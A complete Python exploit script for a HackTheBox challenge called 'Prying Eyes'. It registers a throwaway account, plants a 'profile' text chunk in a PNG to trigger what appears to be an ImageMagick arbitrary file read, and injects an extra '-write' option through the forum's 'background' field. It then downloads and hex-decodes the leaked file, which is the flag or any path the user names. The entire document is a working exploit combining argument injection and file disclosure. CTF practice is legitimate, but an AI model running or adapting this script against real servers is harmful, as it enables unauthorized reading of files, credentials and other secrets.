from uuid import uuid4 
from bs4 import BeautifulSoup
import requests, string, argparse, random, re, os
from PIL import Image, PngImagePlugin


parser = argparse.ArgumentParser(description='Exploit of Prying Eyes challenge from HackTheBox')
parser.add_argument('-rhost', action='store', dest='rhost', required=True, help='Challenge IP')
parser.add_argument('--image', action='store', dest='image', help='Input PNG file', required=True)
parser.add_argument('--read-file', action='store', dest='file_to_read', help='File to read', required=False)
parser.add_argument('--get-flag', action='store_true', help='Get chall flag')
arguments = parser.parse_args()


r = requests.Session()
LARGE_ENOUGH_NUMBER = 100
PngImagePlugin.MAX_TEXT_CHUNK = LARGE_ENOUGH_NUMBER * (1024**2)


def get_random_string():
    result_str = ''.join(random.choice(string.ascii_letters) for i in range(8))

    return result_str


def trigger_login():
	login = {
	"username": ""+get_random_string(), 
	"password": ""+get_random_string()
	}

	r.post(f"{arguments.rhost}/auth/register", data=login, allow_redirects=False)
	r.post(f"{arguments.rhost}/auth/login", data=login, allow_redirects=False)

	return True


def parser_posts():

	resp = r.get(f"{arguments.rhost}/forum", allow_redirects=False)
	id_post = re.search("\"/forum/post/(.*)?\"", resp.text).group(1).split('"')[0]

	return id_post


def exploit_cve(file_to_read):
	img = Image.open(arguments.image)

	info = PngImagePlugin.PngInfo()
	info.add_text('profile', file_to_read, zip=False)

	img.save(arguments.image, 'PNG', pnginfo=info)

	return True


def send_img():
	id_post = parser_posts()
	uid = uuid4()

	file = {
	"message": (None, "Get flag"), 
	"image": open(f"{arguments.image}", "rb"), 
	"background": (None, f"none -write /home/node/app/uploads/{uid}.png"),
	"parentId": (None, f"{id_post}")
	}

	r.post(f"{arguments.rhost}/forum/post", files=file, allow_redirects=False)
	
	return f"{uid}.png"


def get_file(file_to_read):
	uid_image = send_img()

	if os.path.splitext(file_to_read)[1]:
		ext = f'Raw profile type {file_to_read.split(".")[1]}'
		img = Image.open(r.get(f"{arguments.rhost}/uploads/{uid_image}", stream=True).raw)
		img.load()

		hexa_img = img.info[f'{ext}'].strip().split("\n")[2:]
		decode_string_img = ''.join(hexa_img)
		decode_img = bytes.fromhex(decode_string_img).decode()

		return decode_img

	else:
		img = Image.open(r.get(f"{arguments.rhost}/uploads/{uid_image}", stream=True).raw)
		img.load()

		hexa_img = img.info['Raw profile type'].strip().split("\n")[1:]
		decode_string_img = ''.join(hexa_img)
		decode_img = bytes.fromhex(decode_string_img).decode()

		return decode_img


def main():

	if arguments.get_flag == True:
		file_to_read = "/proc/self/cwd/flag.txt"

		trigger_login()
		exploit_cve(file_to_read)
		
		print(get_file(file_to_read))
	
	elif arguments.file_to_read != None:
		file_to_read = arguments.file_to_read

		trigger_login()
		exploit_cve(file_to_read)
		
		print(get_file(file_to_read))
	
	else:
		print("Bro, the 'read-file' argument is missing :(")

if __name__ == "__main__":
	main()
